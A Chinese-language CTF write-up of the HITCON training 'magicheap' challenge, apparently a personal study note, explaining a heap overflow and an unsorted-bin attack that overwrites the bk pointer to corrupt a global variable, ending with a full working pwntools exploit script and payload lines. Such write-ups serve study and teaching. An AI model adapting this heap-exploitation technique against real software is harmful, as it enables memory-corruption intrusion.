---
title: "hitcontrainingmagicheap"
date: 2026-11-13 19:08:04
categories:
  - "题目复现"
  - "HITCON"
tags: ["unsorted-bin"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#3 -->
找的一道unsoretdbin攻击的题目

![image-20261014143227998](/pwn-notes/images/notes/image-20261014143227998.png)

检查保护，虽然现在还不知道堆题检查保护有什么用

![image-20261014143534722](/pwn-notes/images/notes/image-20261014143534722.png)

主要函数

![image-20261014143553101](/pwn-notes/images/notes/image-20261014143553101.png)

后门函数，只需要将

![image-20261014143658412](/pwn-notes/images/notes/image-20261014143658412.png)

所以先依靠前面的漏洞点修改magic的值，之后再次4869就可以

![image-20261014143924409](/pwn-notes/images/notes/image-20261014143924409.png)

creat函数

![image-20261014143942454](/pwn-notes/images/notes/image-20261014143942454.png)

edit函数

![image-20261014144000882](/pwn-notes/images/notes/image-20261014144000882.png)

delete函数

只是看到没有uaf，指针被清零

倒是觉得edit函数存在堆溢出

倒是可以连续申请，释放一个，之后堆溢出修改bk指针，为magic-0x10

之后magic的值就会变成libc地址，总之应该比要求的要大。

![image-20261014144607430](/pwn-notes/images/notes/image-20261014144607430.png)

magic 地址

0x6020a0

![image-20261014145601904](/pwn-notes/images/notes/image-20261014145601904.png)

首先创建的两个chunk,其中一个满足fastbin，另一个满足unsortedbin

接下来删除第二个

![image-20261014145924741](/pwn-notes/images/notes/image-20261014145924741.png)

并没有找到

因为chunk1和top chunk合并

![image-20261014150149121](/pwn-notes/images/notes/image-20261014150149121.png)

加上第3个堆块之后，就有可以看到

此时的fd和bk已经指向了main_area

![image-20261014150307884](/pwn-notes/images/notes/image-20261014150307884.png)

接下来编辑chunk0来进行，修改unsortedbin中的bk指针为magic-0x10

![image-20261014150539475](/pwn-notes/images/notes/image-20261014150539475.png)

可以看到此时里面没有值

溢出过程：

第一次;

![image-20261014151243899](/pwn-notes/images/notes/image-20261014151243899.png)

bk指针已经修改为0x602090

接下来应该是再次申请一次，就可以修改magic的值了

![image-20261014151657438](/pwn-notes/images/notes/image-20261014151657438.png)

gdb开启失败，应该是伪造的相关问题

pay=b'a'*0x38+p64(magic-0x10)

这个只是将chunk0的数据区覆盖，之后跳过size,跳过fd，直接到达bk并修改，哪有那么容易，虽然确实修改了

![image-20261014152103534](/pwn-notes/images/notes/image-20261014152103534.png)

当时确实报错了

再次修改

pay=b'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)

修改完之后的

![image-20261014152320746](/pwn-notes/images/notes/image-20261014152320746.png)

成功出现，并且bk指针也是预期的，这是申请完之后的，也就是脱链操作已经进行完之后的，此时可以看看magic的值是否修改完成。

![image-20261014152512895](/pwn-notes/images/notes/image-20261014152512895.png)

修改完成。

此时只需要发送那个啥就行了。

![image-20261014153350824](/pwn-notes/images/notes/image-20261014153350824.png)

成功了

exp：

```python
from pwn import*
r=process('./pwn')
magic=0x6020a0
#gdb.attach(r)
def create(size,content):
	r.recvuntil(':')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(size))
	r.recvuntil(':')
	r.sendline(content)

def edit(idx,size,content):
	r.recvuntil(':')
	r.sendline('2')
	r.recvuntil(':')
	r.sendline(str(idx))
	r.recvuntil(':')
	r.sendline(str(size))
	r.recvuntil(':')
	r.sendline(content)

def delete(idx):
	r.recvuntil(':')
	r.sendline('3')
	r.recvuntil(':')
	r.sendline(str(idx))

create(0x20,b'aaaa')
create(0x80,b'bbbb')
create(0x20,b'aaaa')

delete(1)

pay=b'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)
edit(0,len(pay),pay)

create(0x80,b'bbbb')
r.sendlineafter(b':',b'4869')
r.interactive()
```

<!-- sync-hash: 5504abe0970c1513f950f5ca48f466595434378d71bffd365365587aa4dcf214 -->
